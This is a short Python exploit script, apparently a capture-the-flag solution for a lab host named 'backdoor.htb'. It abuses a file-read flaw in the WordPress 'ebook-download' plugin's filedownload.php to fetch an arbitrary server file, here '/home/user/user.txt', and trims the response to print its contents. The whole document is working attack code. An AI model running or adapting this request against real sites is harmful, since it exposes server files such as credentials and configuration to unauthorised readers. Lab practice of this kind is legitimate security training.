#!/usr/bin/env python3

import requests

file = "/home/user/user.txt"

garb = "<script>window.close()</script>"
lfi = f'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl={file}'

r = requests.get(lfi)
result = r.text[len(file) * 3: -1 * len(garb)]
print(result)

